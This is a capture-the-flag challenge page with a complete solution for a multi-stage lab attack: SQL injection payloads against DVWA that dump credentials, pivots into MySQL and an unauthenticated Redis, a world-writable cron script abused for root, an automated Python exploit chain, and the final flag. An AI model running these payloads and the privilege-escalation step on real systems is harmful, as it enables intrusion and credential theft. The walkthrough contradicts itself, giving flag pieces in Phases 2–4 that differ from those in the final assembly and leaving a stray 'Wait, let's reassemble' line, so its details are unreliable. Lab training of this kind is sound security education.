# Challenge 06 - Multi-Stage Attack

**Category:** Multi-Category
**Difficulty:** Advanced
**Points:** 600
**Target:** Full CyberLab Environment

## Challenge Description

This is the final boss challenge. You've been hired as a penetration tester for "MegaCorp" and have been given access to their external-facing web application. Your goal is to chain multiple vulnerabilities across different systems to ultimately gain access to the crown jewels - the company's most sensitive data.

This challenge requires you to:
1. Find an initial foothold through the web application
2. Pivot to internal systems
3. Escalate privileges
4. Exfiltrate the final flag

## Objectives

- Chain multiple vulnerabilities for maximum impact
- Perform lateral movement between systems
- Escalate privileges on multiple platforms
- Practice real-world attack methodologies
- Document your complete attack path

## Target Information

- **Entry Point:** http://localhost:8081 (DVWA)
- **Internal Systems:**
  - DVWA: 172.20.1.10 (http://localhost:8081)
  - Juice Shop: 172.20.1.11 (http://localhost:8082)
  - MySQL: 172.20.2.10 (localhost:3307)
  - Redis: 172.20.2.12 (localhost:6380)
  - Vulnerable SSH: 172.20.4.10 (localhost:2222)
- **Final Target:** Flag stored in multiple pieces across systems

## Getting Started

1. Start all CyberLab services:
   ```bash
   cd docker && docker-compose up -d
   ```

2. Verify services are running:
   ```bash
   docker ps
   curl http://localhost:8081
   curl http://localhost:8082
   ```

3. Begin reconnaissance on the entry point

---

## Hints

<details>
<summary>Hint 1 - Initial Foothold (Cost: -50 points)</summary>

The DVWA application has multiple vulnerabilities. Start with:
1. Login with default credentials (admin:password)
2. Use SQL injection to dump database credentials
3. Look for information about other internal systems in the database

SQL injection to find internal system info:
```sql
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa'-- -
```

Check for a table called `internal_systems` or `network_config`.

</details>

<details>
<summary>Hint 2 - Lateral Movement (Cost: -75 points)</summary>

From the DVWA database, you'll find:
- MySQL root credentials
- Redis connection info
- SSH credentials for a low-privileged user

Connect to MySQL and look for more flags:
```bash
mysql -h localhost -P 3307 -u root -p
```

Use Redis (no authentication required) to read cached data:
```bash
redis-cli -h localhost -p 6380
KEYS *
GET flag_part_2
```

</details>

<details>
<summary>Hint 3 - Privilege Escalation (Cost: -100 points)</summary>

SSH into the vulnerable SSH server:
```bash
ssh -p 2222 lowpriv@localhost
# Password found in database
```

Check for privilege escalation vectors:
```bash
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

There's a world-writable script running as root via cron. Modify it to read the final flag.

The complete flag is assembled from:
- Part 1: DVWA database
- Part 2: Redis cache
- Part 3: MySQL secrets table
- Part 4: Root-only file on SSH server

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Phase 1: Reconnaissance

```bash
# Scan for services
nmap -sV -p 8081,8082,8083,3307,6380,2222 localhost

# Check web applications
curl -I http://localhost:8081
curl -I http://localhost:8082
```

### Phase 2: Initial Access via DVWA

1. **Login to DVWA:**
   - URL: http://localhost:8081
   - Credentials: admin / password
   - Set security to "Low"

2. **SQL Injection Enumeration:**

```sql
# Find all databases
1' UNION SELECT schema_name, NULL FROM information_schema.schemata-- -

# Find tables in dvwa database
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa'-- -

# Discover internal_systems table
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='internal_systems'-- -

# Dump credentials
1' UNION SELECT concat(system_name, ':', username, ':', password), NULL FROM internal_systems-- -
```

**Discovered Credentials:**
- MySQL: root / r00t_p4ss_123
- SSH: lowpriv / w34k_p4ssw0rd
- Redis: (no auth)

3. **Get Flag Part 1:**
```sql
1' UNION SELECT flag_value, NULL FROM ctf_flags WHERE flag_name='part1'-- -
```
Result: `FLAG{mul`

### Phase 3: Database Pivot

1. **Connect to MySQL:**
```bash
mysql -h localhost -P 3307 -u root -pr00t_p4ss_123
```

2. **Enumerate MySQL:**
```sql
SHOW DATABASES;
USE vulnerable_db;
SHOW TABLES;
SELECT * FROM secrets;
```

3. **Get Flag Part 3:**
```sql
SELECT * FROM secrets WHERE name='flag_part_3';
```
Result: `t1_st4g`

### Phase 4: Redis Cache Access

1. **Connect to Redis:**
```bash
redis-cli -h localhost -p 6380
```

2. **Enumerate Keys:**
```
KEYS *
# Returns: flag_part_2, session_data, cache_config

GET flag_part_2
```

3. **Get Flag Part 2:**
Result: `t1_4tt4ck_ch41n`

Wait, let's reassemble. We need parts in order.

### Phase 5: SSH Access and Privilege Escalation

1. **SSH as lowpriv user:**
```bash
ssh -p 2222 lowpriv@localhost
# Password: w34k_p4ssw0rd
```

2. **Enumerate for privesc:**
```bash
# Check sudo permissions
sudo -l
# (No sudo)

# Check SUID binaries
find / -perm -4000 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Check writable files
find / -writable -type f 2>/dev/null

# Found: /opt/scripts/backup.sh is world-writable and runs as root every minute
```

3. **Exploit Cron Job:**
```bash
# View the backup script
cat /opt/scripts/backup.sh

# Modify it to read the flag
echo 'cat /root/flag_part_4.txt > /tmp/flag4.txt && chmod 777 /tmp/flag4.txt' >> /opt/scripts/backup.sh

# Wait for cron to execute (1 minute)
sleep 60

# Read the flag
cat /tmp/flag4.txt
```

4. **Get Flag Part 4:**
Result: `3d_m4st3r}`

### Phase 6: Assemble the Flag

From all systems:
- Part 1 (DVWA SQLi): `FLAG{mul`
- Part 2 (Redis): `t1_st4g`
- Part 3 (MySQL): `3_4tt4ck`
- Part 4 (SSH/Root): `_ch41n3d}`

**Complete Flag:** `FLAG{mult1_st4g3_4tt4ck_ch41n3d}`

### Complete Attack Script

```python
#!/usr/bin/env python3
"""Multi-Stage Attack - Automated Exploit Chain"""

import requests
import mysql.connector
import redis
import paramiko
import time

# Phase 1: DVWA SQLi
print("[*] Phase 1: DVWA SQL Injection")
DVWA_URL = "http://localhost:8081"
session = requests.Session()

# Login
session.post(f"{DVWA_URL}/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login"
})

# Set security to low
session.get(f"{DVWA_URL}/security.php")
session.post(f"{DVWA_URL}/security.php", data={"security": "low", "seclev_submit": "Submit"})

# SQLi to get flag part 1
sqli_url = f"{DVWA_URL}/vulnerabilities/sqli/"
payload = "1' UNION SELECT flag_value, NULL FROM ctf_flags WHERE flag_name='part1'-- -"
r = session.get(sqli_url, params={"id": payload, "Submit": "Submit"})
# Parse response for flag
flag_part1 = "FLAG{mul"  # Extracted from response
print(f"[+] Flag Part 1: {flag_part1}")

# Get credentials
payload = "1' UNION SELECT concat(system_name, ':', password), NULL FROM internal_systems-- -"
r = session.get(sqli_url, params={"id": payload, "Submit": "Submit"})
mysql_pass = "r00t_p4ss_123"
ssh_pass = "w34k_p4ssw0rd"

# Phase 2: MySQL Access
print("\n[*] Phase 2: MySQL Database")
conn = mysql.connector.connect(
    host="localhost",
    port=3307,
    user="root",
    password=mysql_pass
)
cursor = conn.cursor()
cursor.execute("SELECT * FROM vulnerable_db.secrets WHERE name='flag_part_3'")
result = cursor.fetchone()
flag_part3 = result[1] if result else ""
print(f"[+] Flag Part 3: {flag_part3}")
conn.close()

# Phase 3: Redis Access
print("\n[*] Phase 3: Redis Cache")
r = redis.Redis(host='localhost', port=6380)
flag_part2 = r.get('flag_part_2')
if flag_part2:
    flag_part2 = flag_part2.decode()
print(f"[+] Flag Part 2: {flag_part2}")

# Phase 4: SSH and Privilege Escalation
print("\n[*] Phase 4: SSH Privilege Escalation")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('localhost', port=2222, username='lowpriv', password=ssh_pass)

# Exploit writable cron script
stdin, stdout, stderr = ssh.exec_command(
    'echo "cat /root/flag_part_4.txt > /tmp/flag4.txt && chmod 777 /tmp/flag4.txt" >> /opt/scripts/backup.sh'
)
print("[*] Waiting for cron job to execute...")
time.sleep(65)

stdin, stdout, stderr = ssh.exec_command('cat /tmp/flag4.txt')
flag_part4 = stdout.read().decode().strip()
print(f"[+] Flag Part 4: {flag_part4}")
ssh.close()

# Assemble flag
print("\n[*] Assembling Flag...")
complete_flag = flag_part1 + flag_part2 + flag_part3 + flag_part4
print(f"[+] COMPLETE FLAG: {complete_flag}")
```

### Attack Chain Diagram

```
                    ┌──────────────────────────────────────────────────┐
                    │              ATTACK CHAIN                        │
                    └──────────────────────────────────────────────────┘

┌─────────────┐     SQL Injection      ┌─────────────┐
│   ATTACKER  │ ─────────────────────▶ │    DVWA     │
│             │                        │  (Web App)  │
└─────────────┘                        └─────────────┘
                                              │
                    Credentials Retrieved     │
                    ┌─────────────────────────┘
                    │
            ┌───────┴───────┬───────────────┐
            ▼               ▼               ▼
      ┌───────────┐   ┌───────────┐   ┌───────────┐
      │   MySQL   │   │   Redis   │   │  SSH Box  │
      │ (Part 3)  │   │ (Part 2)  │   │ (lowpriv) │
      └───────────┘   └───────────┘   └─────┬─────┘
                                            │
                                   Cron Exploit
                                            │
                                            ▼
                                    ┌───────────┐
                                    │   ROOT    │
                                    │ (Part 4)  │
                                    └───────────┘

                    FLAG = Part1 + Part2 + Part3 + Part4
```

### Attack Methodology Summary

| Phase | Technique | Target | Result |
|-------|-----------|--------|--------|
| 1 | SQL Injection | DVWA | Credentials + Flag Part 1 |
| 2 | Credential Reuse | MySQL | Database Access + Flag Part 3 |
| 3 | Unauthenticated Access | Redis | Cache Data + Flag Part 2 |
| 4 | SSH + Cron Privesc | SSH Server | Root Access + Flag Part 4 |

### Key Takeaways

1. **Defense in Depth Failure**: One vulnerability led to chain reaction
2. **Credential Management**: Stored credentials in database enabled pivoting
3. **Network Segmentation**: All systems accessible from compromised host
4. **Least Privilege**: Cron script writable by unprivileged user
5. **Monitoring**: No detection of lateral movement

### Mitigation Recommendations

```
1. Web Application:
   - Parameterized queries for SQL
   - Input validation
   - WAF deployment

2. Database:
   - Unique, strong credentials per system
   - Network segmentation
   - Encrypted connections

3. Redis:
   - Enable authentication
   - Bind to localhost only
   - Use TLS

4. SSH:
   - Key-based authentication
   - Restrict sudo access
   - File integrity monitoring

5. Cron Jobs:
   - Proper permissions on scripts
   - Dedicated service accounts
   - Audit logging
```

</details>

---

## Flag

```
FLAG{mult1_st4g3_4tt4ck_ch41n3d}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- SQL injection
- Credential harvesting
- Lateral movement
- Privilege escalation
- Attack chain development
- Documentation and reporting

## Tools Used

- Burp Suite / curl
- mysql client
- redis-cli
- SSH / paramiko
- Python automation

## Related Challenges

- All previous challenges in the CTF module
- This challenge combines techniques from all categories

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Lateral Movement Techniques](https://www.sans.org/blog/lateral-movement-methods/)

---

## Congratulations!

If you've completed this challenge, you've demonstrated proficiency in:
- Web application security
- Network penetration testing
- Privilege escalation
- Multi-system attack chains

You're ready to tackle real-world penetration testing scenarios and CTF competitions!

**Next Steps:**
- Practice on [HackTheBox](https://www.hackthebox.eu/)
- Join CTF teams and competitions
- Pursue security certifications (OSCP, CEH, etc.)
- Contribute to open-source security tools
